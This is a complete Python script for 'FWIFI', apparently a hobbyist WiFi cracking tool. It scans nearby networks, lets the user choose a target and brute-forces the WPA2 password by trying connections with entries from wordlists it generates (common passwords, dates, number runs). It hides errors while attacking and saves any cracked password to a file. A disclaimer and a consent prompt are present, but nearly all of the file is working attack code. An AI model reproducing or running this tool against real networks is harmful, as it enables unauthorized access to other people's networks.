#!/usr/bin/env python3
"""
FWIFI - WiFi Security Assessment Tool
Complete version with full error suppression and sequential testing
"""

import pywifi
from pywifi import const
import time
import os
import sys
import logging
import shutil
from datetime import datetime

# ==============================
# COMPLETE LOGGING SUPPRESSION
# ==============================

# Disable all logging from pywifi and related modules
logging.getLogger('pywifi').disabled = True
logging.getLogger('wifi').disabled = True
logging.getLogger('socket').disabled = True
logging.getLogger('urllib3').disabled = True

# Also disable warnings
import warnings
warnings.filterwarnings("ignore")

# ==============================
# ANSI COLOR CODES
# ==============================

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

# Shortcuts
R = Colors.RED
G = Colors.GREEN
Y = Colors.YELLOW
B = Colors.BLUE
P = Colors.PURPLE
C = Colors.CYAN
W = Colors.WHITE
GR = Colors.GRAY
X = Colors.RESET

# ==============================
# GLOBAL STATE
# ==============================

class State:
    ssid = None
    bssid = None
    signal = None
    network = None
    wordlist = "wordlists/default.txt"
    found = False
    password = None
    attempts = 0
    start_time = 0
    iface = None

state = State()

# ==============================
# UTILITY FUNCTIONS
# ==============================

def clear():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_width():
    """Get terminal width"""
    try:
        return shutil.get_terminal_size().columns
    except:
        return 100

def print_center(text):
    """Print centered text"""
    width = get_width()
    clean = remove_colors(text)
    padding = (width - len(clean)) // 2
    print(" " * padding + text)

def remove_colors(text):
    """Remove ANSI color codes from text"""
    import re
    return re.sub(r'\033\[[0-9;]*m', '', text)

def print_line(char="─", color=Y):
    """Print a horizontal line"""
    width = get_width()
    print(color + char * width + X)

def print_box(text, color=C):
    """Print text in a box"""
    width = get_width()
    clean = remove_colors(text)
    print(color + "╔" + "═" * (width - 2) + "╗" + X)
    print(color + "║" + text.center(width - 2) + "║" + X)
    print(color + "╚" + "═" * (width - 2) + "╝" + X)

def print_status(msg, status="info"):
    """Print status message"""
    icons = {
        "info": f"{C}[*]{X}",
        "success": f"{G}[+]{X}",
        "error": f"{R}[-]{X}",
        "warning": f"{Y}[!]{X}",
        "question": f"{B}[?]{X}"
    }
    print(f"{icons.get(status, icons['info'])} {msg}")

# ==============================
# BANNER & ART
# ==============================

def print_banner():
    """Display the main banner"""
    clear()
    
    # ASCII Art with FWIFI
    ascii_art = [
        f"{R}███████╗{B}██╗    ██╗{R}██╗{B}███████╗{R}██╗{X}",
        f"{R}██╔════╝{B}██║    ██║{R}██║{B}██╔════╝{R}██║{X}",
        f"{R}█████╗  {B}██║ █╗ ██║{R}██║{B}█████╗  {R}██║{X}",
        f"{R}██╔══╝  {B}██║███╗██║{R}██║{B}██╔══╝  {R}╚═╝{X}",
        f"{R}██║     {B}╚███╔███╔╝{R}██║{B}██║     {R}██╗{X}",
        f"{R}╚═╝      {B}╚══╝╚══╝ {R}╚═╝{B}╚═╝     {R}╚═╝{X}"
    ]
    
    width = get_width()
    
    # Print top border
    print(Y + "╔" + "═" * (width - 2) + "╗" + X)
    print(Y + "║" + " " * (width - 2) + "║" + X)
    
    # Print ASCII art
    for line in ascii_art:
        clean = remove_colors(line)
        padding = (width - len(clean)) // 2
        print(Y + "║" + X + " " * padding + line + " " * (width - padding - len(clean) - 2) + Y + "║" + X)
    
    print(Y + "║" + " " * (width - 2) + "║" + X)
    
    # Tool info
    info = [
        f"{C}║   WiFi Security Assessment Tool v3.1   ║{X}",
        f"{G}║     Author: KRISH | Ethical Use Only     ║{X}",
        f"{G}║    JOIN US: https://www.hackerseye.in     ║{X}",
        f"{Y}╚══════════════════════════════════════════╝{X}"
    ]
    
    for line in info:
        clean = remove_colors(line)
        padding = (width - len(clean)) // 2
        print(Y + "║" + X + " " * padding + line + " " * (width - padding - len(clean) - 2) + Y + "║" + X)
    
    print(Y + "║" + " " * (width - 2) + "║" + X)
    print(Y + "╚" + "═" * (width - 2) + "╝" + X)
    
    # Show current target
    if state.ssid:
        print_line()
        print_center(f"{C}Target:{X} {W}{state.ssid}{X}")
        print_center(f"{C}BSSID:{X} {GR}{state.bssid}{X}")
        print_center(f"{C}Signal:{X} {G}{state.signal}%{X}")
        print_center(f"{C}Wordlist:{X} {P}{state.wordlist}{X}")
        print_line()

# ==============================
# INITIALIZATION
# ==============================

def check_system():
    """Check system requirements"""
    try:
        # Check root on Linux
        if os.name == 'posix' and os.geteuid() != 0:
            print_status("This tool requires root privileges", "error")
            print_status(f"Run: sudo python3 {sys.argv[0]}", "warning")
            return False
        
        # Initialize WiFi
        wifi = pywifi.PyWiFi()
        if not wifi.interfaces():
            print_status("No WiFi interface found", "error")
            print_status("Make sure WiFi adapter is enabled", "warning")
            return False
        
        state.iface = wifi.interfaces()[0]
        return True
        
    except Exception as e:
        print_status(f"System check failed: {str(e)}", "error")
        return False

def legal_warning():
    """Display legal disclaimer"""
    clear()
    
    warning = f"""
{R}╔════════════════════════════════════════════════════════════════╗
║                       ⚠️  LEGAL DISCLAIMER  ⚠️                      ║
╚════════════════════════════════════════════════════════════════╝{X}

{Y}THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!{X}

{G}✓ Legal Uses:{X}
  • Testing your own networks
  • Authorized penetration testing
  • Educational lab environments

{R}✗ Illegal Uses:{X}
  • Unauthorized network access
  • Violating computer fraud laws
  • Any malicious activity

{Y}By continuing, you agree to use this tool responsibly and legally.{X}

{C}Continue? (yes/no): {X}"""
    
    print(warning)
    return input().strip().lower() in ['y', 'yes']

def create_wordlists():
    """Create necessary wordlists"""
    os.makedirs("wordlists", exist_ok=True)
    os.makedirs("results", exist_ok=True)
    
    # Default wordlist with sequential numbers
    default_path = "wordlists/default.txt"
    if not os.path.exists(default_path):
        print_status("Creating default wordlist...", "info")
        
        passwords = [
            # Sequential numbers (1-20)
            "1", "2", "3", "4", "5", "6", "7", "8", "9", "10",
            "11", "12", "13", "14", "15", "16", "17", "18", "19", "20",
            
            # Common passwords
            "password", "123456", "12345678", "1234", "qwerty",
            "admin", "welcome", "12345", "password123", "admin123",
            "letmein", "monkey", "dragon", "baseball", "football",
            "hello", "secret", "asdf", "jordan", "superman",
            "batman", "trustno1", "master", "sunshine", "iloveyou",
            
            # WiFi common
            "wifipassword", "wireless", "internet", "mywifi", "homewifi",
            "linksys", "netgear", "dlink", "cisco", "belkin",
            
            # Year based
            "2024", "2023", "2022", "2021", "2020",
            "2019", "2018", "2017", "2016", "2015",
            
            # Month based
            "january", "february", "march", "april", "may",
            "june", "july", "august", "september", "october",
            "november", "december",
            
            # Simple patterns
            "abc123", "qwerty123", "asdfgh", "zxcvbn", "qazwsx",
            "123abc", "123qwe", "1q2w3e", "1qaz2wsx", "q1w2e3r4",
            
            # Phone patterns
            "0000", "1111", "2222", "3333", "4444",
            "5555", "6666", "7777", "8888", "9999",
            
            # Common names
            "john", "michael", "david", "robert", "james",
            "mary", "jennifer", "linda", "patricia", "elizabeth"
        ]
        
        with open(default_path, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        print_status(f"Created wordlist with {len(passwords)} passwords", "success")
    
    state.wordlist = default_path

# ==============================
# WIFI FUNCTIONS
# ==============================

def scan():
    """Scan for WiFi networks"""
    try:
        print_status("Scanning for networks...", "info")
        state.iface.scan()
        
        # Show scanning animation
        for i in range(3):
            time.sleep(1)
            print(f"{C}.{X}", end='', flush=True)
        print()
        
        results = state.iface.scan_results()
        if not results:
            print_status("No networks found", "warning")
            return []
        
        return results
        
    except Exception as e:
        print_status(f"Scan failed: {str(e)}", "error")
        return []

def show_networks(networks):
    """Display found networks"""
    if not networks:
        return
    
    print_box(f"FOUND {len(networks)} NETWORKS", G)
    print(f"{C}{'No.':<4} {'SSID':<25} {'Signal':<8} {'BSSID':<17}{X}")
    print_line("─", C)
    
    for i, net in enumerate(networks, 1):
        ssid = net.ssid if net.ssid else "Hidden Network"
        signal = min(100, max(0, (net.signal + 100) * 2))
        
        # Color code signal
        if signal > 70:
            color = G
        elif signal > 40:
            color = Y
        else:
            color = R
        
        # Truncate long SSIDs
        display_ssid = ssid[:24] + ".." if len(ssid) > 26 else ssid.ljust(26)
        
        print(f" {C}{i:>3}.{X} {display_ssid} {color}{int(signal):>3}%{X}  {GR}{net.bssid}{X}")

def select_target():
    """Select target network"""
    networks = scan()
    if not networks:
        return False
    
    show_networks(networks)
    
    while True:
        try:
            choice = input(f"\n{Y}[?] Select network (0=rescan, -1=cancel): {X}").strip()
            
            if choice == "0":
                return select_target()
            elif choice == "-1":
                return False
            
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                net = networks[idx]
                state.network = net
                state.ssid = net.ssid if net.ssid else "Hidden_Network"
                state.bssid = net.bssid
                state.signal = int(min(100, max(0, (net.signal + 100) * 2)))
                
                print_status(f"Target: {state.ssid}", "success")
                return True
            else:
                print_status("Invalid selection", "error")
                
        except ValueError:
            print_status("Enter a number", "error")

# ==============================
# ATTACK ENGINE WITH COMPLETE SUPPRESSION
# ==============================

def test_password(password):
    """Test a single password with complete error suppression"""
    try:
        # Create profile
        profile = pywifi.Profile()
        profile.ssid = state.ssid
        profile.auth = const.AUTH_ALG_OPEN
        
        if state.network and state.network.akm:
            profile.akm = state.network.akm
        else:
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
        
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        # Remove existing profiles
        state.iface.remove_all_network_profiles()
        
        # Add new profile
        tmp_profile = state.iface.add_network_profile(profile)
        
        # Connect with timeout
        state.iface.connect(tmp_profile)
        
        # Check connection status
        timeout = 4  # Reduced timeout for faster testing
        start = time.time()
        
        while state.iface.status() == const.IFACE_CONNECTING:
            if time.time() - start > timeout:
                state.iface.disconnect()
                return False
            time.sleep(0.3)
        
        connected = state.iface.status() == const.IFACE_CONNECTED
        
        # Always disconnect to clean up
        state.iface.disconnect()
        
        return connected
        
    except Exception:
        # Silent failure - we don't want any output
        return False

def brute_force():
    """Main attack function with silent operation"""
    if not state.ssid:
        print_status("No target selected", "error")
        return
    
    # Load passwords
    try:
        with open(state.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except:
        print_status("Failed to load wordlist", "error")
        return
    
    if not passwords:
        print_status("Wordlist is empty", "error")
        return
    
    print_box(f"ATTACKING: {state.ssid}", R)
    print_center(f"{C}Passwords:{X} {len(passwords)}")
    print_center(f"{C}Start Time:{X} {datetime.now().strftime('%H:%M:%S')}")
    print()
    
    # Confirm
    confirm = input(f"{Y}[?] Start attack? (y/n): {X}").lower()
    if confirm not in ['y', 'yes']:
        print_status("Cancelled", "warning")
        return
    
    # Reset state
    state.found = False
    state.password = None
    state.attempts = 0
    state.start_time = time.time()
    
    print_line()
    print(f"{C}Starting attack... Press Ctrl+C to stop{X}")
    print_line()
    
    # Suppress ALL output during attack
    old_stdout = sys.stdout
    old_stderr = sys.stderr
    
    try:
        # Redirect ALL output to null during password testing
        with open(os.devnull, 'w') as devnull:
            sys.stdout = devnull
            sys.stderr = devnull
            
            for idx, pwd in enumerate(passwords, 1):
                state.attempts = idx
                
                # Calculate progress
                progress = (idx / len(passwords)) * 100
                elapsed = time.time() - state.start_time
                speed = idx / elapsed if elapsed > 0 else 0
                remaining = (len(passwords) - idx) / speed if speed > 0 else 0
                
                # Restore output for progress display only
                sys.stdout = old_stdout
                sys.stderr = old_stderr
                
                # Show progress
                if len(pwd) < 6:
                    pwd_color = R
                elif len(pwd) < 8:
                    pwd_color = Y
                else:
                    pwd_color = G
                
                print(f"\r{C}[{idx:05d}/{len(passwords):05d}] {progress:5.1f}% | "
                      f"{speed:6.1f} pwd/sec | ETA: {remaining:4.0f}s | "
                      f"{pwd_color}{pwd[:35]:<35}{X}", end='', flush=True)
                
                # Suppress again for testing
                sys.stdout = devnull
                sys.stderr = devnull
                
                # Test password
                if test_password(pwd):
                    state.found = True
                    state.password = pwd
                    break
        
        # Restore output
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        
    except KeyboardInterrupt:
        # Restore output on interrupt
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        print(f"\n\n{Y}[!] Attack interrupted{X}")
        return
        
    finally:
        # Ensure output is restored
        sys.stdout = old_stdout
        sys.stderr = old_stderr
    
    # Show results
    print("\n")
    print_line("═", G if state.found else R)
    
    if state.found:
        save_result()
        show_success()
    else:
        show_failure()

def save_result():
    """Save successful result"""
    try:
        filename = f"results/{state.ssid.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("FWIFI TOOL - SUCCESSFUL CRACK\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Network:      {state.ssid}\n")
            f.write(f"BSSID:        {state.bssid}\n")
            f.write(f"Password:     {state.password}\n")
            f.write(f"Signal:       {state.signal}%\n")
            f.write(f"Attempts:     {state.attempts}\n")
            f.write(f"Time:         {time.time() - state.start_time:.1f}s\n")
            f.write(f"Speed:        {state.attempts/(time.time() - state.start_time):.1f} pwd/sec\n")
            f.write(f"Date:         {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        print_status(f"Results saved to {filename}", "success")
    except:
        print_status("Failed to save results", "error")

def show_success():
    """Display success screen"""
    print_box("🎉 PASSWORD FOUND! 🎉", G)
    print_center(f"{C}Network:{X} {W}{state.ssid}{X}")
    print_center(f"{C}Password:{X} {G}{state.password}{X}")
    print_center(f"{C}Attempts:{X} {Y}{state.attempts}{X}")
    print_center(f"{C}Time:{X} {time.time() - state.start_time:.1f}s")
    print()
    input(f"{Y}Press Enter to continue...{X}")

def show_failure():
    """Display failure screen"""
    print_box("❌ ATTACK FAILED ❌", R)
    print_center(f"{C}Network:{X} {state.ssid}")
    print_center(f"{C}Attempted:{X} {state.attempts} passwords")
    print_center(f"{C}Time:{X} {time.time() - state.start_time:.1f}s")
    print_center(f"{Y}No valid password found in wordlist{X}")

# ==============================
# WORDLIST MANAGEMENT
# ==============================

def manage_wordlist():
    """Manage wordlist selection"""
    print_box("WORDLIST MANAGEMENT", P)
    
    # Show current
    current = os.path.basename(state.wordlist)
    print_center(f"{C}Current:{X} {current}")
    
    # Show available
    if os.path.exists("wordlists"):
        print(f"\n{C}Available wordlists:{X}")
        files = [f for f in os.listdir("wordlists") if f.endswith('.txt')]
        for i, f in enumerate(files, 1):
            size = os.path.getsize(f"wordlists/{f}") / 1024
            print(f"  {G}{i}.{X} {f} ({size:.1f} KB)")
    
    print(f"\n{Y}Options:{X}")
    print(f"  {C}1.{X} Select from list")
    print(f"  {C}2.{X} Enter custom path")
    print(f"  {C}3.{X} Create new wordlist")
    print(f"  {C}4.{X} View current wordlist")
    print(f"  {C}5.{X} Cancel")
    
    choice = input(f"\n{Y}[?] Choose option: {X}").strip()
    
    if choice == "1" and os.path.exists("wordlists"):
        files = [f for f in os.listdir("wordlists") if f.endswith('.txt')]
        if files:
            for i, f in enumerate(files, 1):
                print(f"  {G}{i}.{X} {f}")
            sel = input(f"\n{Y}[?] Select wordlist (1-{len(files)}): {X}")
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(files):
                    state.wordlist = f"wordlists/{files[idx]}"
                    print_status(f"Selected: {files[idx]}", "success")
            except:
                print_status("Invalid selection", "error")
    
    elif choice == "2":
        path = input(f"{Y}[?] Enter path to wordlist: {X}").strip()
        if os.path.exists(path):
            state.wordlist = path
            print_status(f"Wordlist set: {path}", "success")
        else:
            print_status("File not found", "error")
    
    elif choice == "3":
        create_custom_wordlist()
    
    elif choice == "4":
        view_wordlist()

# ==============================
# CUSTOM WORDLIST CREATION
# ==============================

def create_custom_wordlist():
    """Create a custom wordlist"""
    print_box("CREATE CUSTOM WORDLIST", P)
    
    name = input(f"{Y}[?] Wordlist name (without .txt): {X}").strip()
    if not name:
        print_status("Cancelled", "warning")
        return
    
    path = f"wordlists/{name}.txt"
    
    print(f"\n{C}What to include:{X}")
    print(f"  {G}1.{X} Sequential numbers (1-1000)")
    print(f"  {G}2.{X} Common passwords")
    print(f"  {G}3.{X} Date combinations")
    print(f"  {G}4.{X} Phone numbers")
    print(f"  {G}5.{X} Custom list")
    print(f"  {G}6.{X} All of the above")
    
    choice = input(f"\n{Y}[?] Choose (1-6): {X}").strip()
    
    passwords = []
    
    if choice in ["1", "6"]:
        # Sequential numbers 1-1000
        passwords.extend([str(i) for i in range(1, 1001)])
        print_status("Added: Numbers 1-1000", "success")
    
    if choice in ["2", "6"]:
        # Common passwords
        common = ["password", "123456", "admin", "welcome", "qwerty",
                  "letmein", "monkey", "sunshine", "password1", "admin123"]
        passwords.extend(common)
        print_status("Added: Common passwords", "success")
    
    if choice in ["3", "6"]:
        # Date combinations
        dates = []
        for y in range(2000, 2025):
            for m in range(1, 13):
                for d in range(1, 32):
                    dates.append(f"{d:02d}{m:02d}{y}")
                    dates.append(f"{m:02d}{d:02d}{y}")
        passwords.extend(dates[:1000])  # Limit to 1000 dates
        print_status("Added: Date combinations", "success")
    
    if choice in ["4", "6"]:
        # Phone patterns
        phones = ["0000", "1111", "1234", "4321", "9999",
                  "1212", "1313", "1414", "1515", "123123"]
        passwords.extend(phones)
        print_status("Added: Phone patterns", "success")
    
    if choice == "5":
        # Custom input
        print(f"\n{C}Enter passwords (one per line, empty line to finish):{X}")
        while True:
            pwd = input(f"{GR}>>> {X}").strip()
            if not pwd:
                break
            passwords.append(pwd)
        print_status(f"Added {len(passwords)} custom passwords", "success")
    
    # Remove duplicates and save
    passwords = list(dict.fromkeys(passwords))
    
    with open(path, 'w') as f:
        for pwd in passwords:
            f.write(f"{pwd}\n")
    
    print_status(f"Created {name}.txt with {len(passwords)} passwords", "success")
    state.wordlist = path

def view_wordlist():
    """View contents of current wordlist"""
    try:
        with open(state.wordlist, 'r') as f:
            lines = f.readlines()
        
        print_box(f"VIEWING: {os.path.basename(state.wordlist)}", C)
        print_center(f"{C}Total passwords: {len(lines)}{X}")
        print_center(f"{C}File size: {os.path.getsize(state.wordlist)/1024:.1f} KB{X}")
        print()
        
        # Show first 20 passwords
        print(f"{C}First 20 passwords:{X}")
        for i, line in enumerate(lines[:20], 1):
            print(f"  {G}{i:2d}.{X} {line.strip()}")
        
        if len(lines) > 20:
            print(f"  {GR}... and {len(lines)-20} more{X}")
        
        print()
        input(f"{Y}Press Enter to continue...{X}")
        
    except:
        print_status("Failed to read wordlist", "error")

# ==============================
# MENU SYSTEM
# ==============================

def show_help():
    """Show help menu"""
    print_box("HELP & COMMANDS", C)
    
    commands = [
        ("scan", "Scan for WiFi networks"),
        ("target", "Select target network"),
        ("wordlist", "Manage wordlists"),
        ("attack", "Start brute-force attack"),
        ("clear", "Clear screen"),
        ("help", "Show this help"),
        ("exit", "Exit tool")
    ]
    
    for cmd, desc in commands:
        print(f"  {G}{cmd:<10}{X} - {desc}")
    
    print(f"\n{Y}Example workflow:{X}")
    print(f"  1. {C}scan{X} - Find networks")
    print(f"  2. {C}target{X} - Choose target")
    print(f"  3. {C}wordlist{X} - Set wordlist")
    print(f"  4. {C}attack{X} - Start cracking")

def main_menu():
    """Main menu loop"""
    while True:
        try:
            prompt = f"{G}FWIFI"
            if state.ssid:
                prompt += f"@{state.ssid[:15]}"
            prompt += f"${X} "
            
            cmd = input(prompt).strip().lower()
            
            if cmd == "scan":
                networks = scan()
                show_networks(networks)
            elif cmd == "target":
                if select_target():
                    print_banner()
            elif cmd == "wordlist":
                manage_wordlist()
                print_banner()
            elif cmd == "attack":
                brute_force()
                print_banner()
            elif cmd in ["clear", "cls"]:
                print_banner()
            elif cmd == "help":
                show_help()
            elif cmd in ["exit", "quit"]:
                print_status("Goodbye!", "info")
                sys.exit(0)
            elif cmd:
                print_status(f"Unknown command: {cmd}", "error")
                
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Type 'exit' to quit{X}")
        except Exception as e:
            print_status(f"Error: {str(e)}", "error")

# ==============================
# MAIN FUNCTION
# ==============================

def main():
    """Main entry point"""
    try:
        # System check
        if not check_system():
            sys.exit(1)
        
        # Legal warning
        if not legal_warning():
            print_status("Consent not given. Exiting.", "warning")
            sys.exit(0)
        
        # Setup
        create_wordlists()
        
        # Show banner
        print_banner()
        show_help()
        
        # Start menu
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{R}[!] Tool terminated{X}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] Fatal error: {str(e)}{X}")
        sys.exit(1)

# ==============================
# ENTRY POINT
# ==============================

if __name__ == "__main__":
    main()
